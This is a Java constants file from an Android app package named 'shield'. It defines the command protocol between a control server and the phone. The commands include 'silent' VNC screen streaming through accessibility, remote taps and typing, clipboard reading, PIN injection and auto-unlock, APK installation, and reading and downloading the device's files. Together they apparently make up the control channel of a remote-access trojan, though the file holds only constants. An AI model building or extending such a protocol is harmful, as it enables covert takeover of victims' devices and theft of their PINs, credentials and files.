package com.alpha.shield;

/**
 * Alpha — shared protocol constants.
 * Single source of truth for all command strings and frame type bytes.
 */
public final class Protocol {

    // ── Binary frame types (server → browser, 1-byte prefix) ──────────────────
    public static final int FRAME_VNC    = 0x01;  // accessibility takeScreenshot
    public static final int FRAME_VNC_V2 = 0x02;  // MediaProjection ImageReader
    public static final int FRAME_FILE   = 0x03;  // chunked file download

    /**
     * Binary VNC frame layout (server → browser):
     *   [0]      frame type   (FRAME_VNC or FRAME_VNC_V2)
     *   [1-36]   deviceId     UTF-8, null-padded to 36 bytes
     *   [37-40]  seq          uint32 BE  — monotonic, wraps at 0xFFFFFFFF
     *   [41]     quality      uint8      — JPEG quality used for this frame
     *   [42-45]  ts_hi        upper 32 bits of System.currentTimeMillis()
     *   [46-49]  ts_lo        lower 32 bits
     *   [50+]    JPEG bytes
     *
     *   Total header: 50 bytes
     */
    public static final int VNC_HDR = 50;

    // ── Outbound message types (APK → Server, JSON "type" field) ─────────────
    public static final String T_REGISTER      = "register";
    public static final String T_VNC_FRAME     = "vnc_frame";       // base64 fallback path
    public static final String T_VNC_V2_FRAME  = "vnc_v2_frame";
    public static final String T_HIERARCHY     = "screen_hierarchy";
    public static final String T_CMD_ACK       = "cmd_result";
    public static final String T_APP_LIST      = "installed_apps";
    public static final String T_FILE_LIST     = "file_list";
    public static final String T_FILE_CHUNK    = "file_chunk";
    public static final String T_FILE_UPLOAD_DONE = "file_upload_done";
    public static final String T_LOCK_STATUS   = "lock_status";
    public static final String T_DEVICE_INFO   = "device_info";
    public static final String T_SCREENSHOT    = "screenshot";
    public static final String T_PING          = "ping";
    public static final String T_PONG          = "pong";

    // ── Inbound commands (Server → APK, "action" or "type" field) ────────────
    // VNC
    public static final String CMD_START_VNC          = "START_SILENT_VNC";
    public static final String CMD_STOP_VNC           = "STOP_SILENT_VNC";
    public static final String CMD_SET_VNC_QUALITY    = "SET_SILENT_VNC_QUALITY";
    public static final String CMD_SET_VNC_FPS        = "SET_VNC_FPS";
    public static final String CMD_FORCE_RESTART_VNC  = "FORCE_RESTART_VNC";
    public static final String CMD_START_VNC_V2       = "START_VNC_V2";
    public static final String CMD_STOP_VNC_V2        = "STOP_VNC_V2";

    // Gestures
    public static final String CMD_TAP           = "TAP";
    public static final String CMD_DOUBLE_TAP    = "DOUBLE_TAP";
    public static final String CMD_LONG_PRESS    = "LONG_PRESS";
    public static final String CMD_SWIPE         = "SWIPE";
    public static final String CMD_PINCH         = "PINCH";
    public static final String CMD_DRAG          = "DRAG";
    public static final String CMD_PATH          = "PATH_GESTURE";
    public static final String CMD_TYPE          = "TYPE";
    public static final String CMD_CLIPBOARD_SET = "SET_CLIPBOARD";
    public static final String CMD_CLIPBOARD_GET = "GET_CLIPBOARD";

    // Navigation
    public static final String CMD_BACK           = "BACK";
    public static final String CMD_HOME           = "HOME";
    public static final String CMD_RECENTS        = "RECENTS";
    public static final String CMD_NOTIFICATIONS  = "NOTIFICATIONS";
    public static final String CMD_QUICK_SETTINGS = "QUICK_SETTINGS";
    public static final String CMD_POWER_MENU     = "POWER_MENU";

    // Screen
    public static final String CMD_WAKEUP              = "WAKEUP";
    public static final String CMD_LOCK_DEVICE         = "LOCK_DEVICE";
    public static final String CMD_VOLUME_UP           = "VOLUME_UP";
    public static final String CMD_VOLUME_DOWN         = "VOLUME_DOWN";
    public static final String CMD_SNAP_SCREEN         = "SNAP_SCREEN";
    public static final String CMD_TOGGLE_TOUCH        = "TOGGLE_TOUCH_VISIBILITY";

    // Ly accessibility reader
    public static final String CMD_REQUEST_HIERARCHY  = "REQUEST_HIERARCHY";

    // App Manager
    public static final String CMD_LIST_APPS     = "LIST_APPS";
    public static final String CMD_LAUNCH_APP    = "LAUNCH_APP";
    public static final String CMD_FORCE_STOP    = "FORCE_STOP_APP";
    public static final String CMD_UNINSTALL     = "UNINSTALL_APP";
    public static final String CMD_INSTALL_APK   = "INSTALL_APK";

    // Lock Manager
    public static final String CMD_AUTO_UNLOCK      = "AUTO_UNLOCK";
    public static final String CMD_GET_LOCK_STATUS  = "GET_LOCK_STATUS";
    public static final String CMD_INJECT_PIN       = "INJECT_PIN";

    // File Manager
    public static final String CMD_LIST_FILES     = "LIST_FILES";
    public static final String CMD_DOWNLOAD_FILE  = "DOWNLOAD_FILE";
    public static final String CMD_UPLOAD_INIT    = "UPLOAD_FILE_INIT";
    public static final String CMD_UPLOAD_CHUNK   = "UPLOAD_FILE_CHUNK";
    public static final String CMD_DELETE_FILE    = "DELETE_FILE";
    public static final String CMD_RENAME_FILE    = "RENAME_FILE";
    public static final String CMD_MKDIR          = "MKDIR";
    public static final String CMD_MOVE_FILE      = "MOVE_FILE";
    public static final String CMD_COPY_FILE      = "COPY_FILE";
    public static final String CMD_READ_FILE      = "READ_FILE";

    // System
    public static final String CMD_GET_DEVICE_INFO = "GET_DEVICE_INFO";
    public static final String CMD_PING            = "PING";

    // ── Silent commands (no cmd_ack broadcast to avoid feed spam) ─────────────
    public static final java.util.Set<String> SILENT_CMDS = new java.util.HashSet<>(
        java.util.Arrays.asList(
            CMD_REQUEST_HIERARCHY,
            CMD_PING,
            CMD_SNAP_SCREEN,
            CMD_GET_LOCK_STATUS
        )
    );

    private Protocol() {}
}
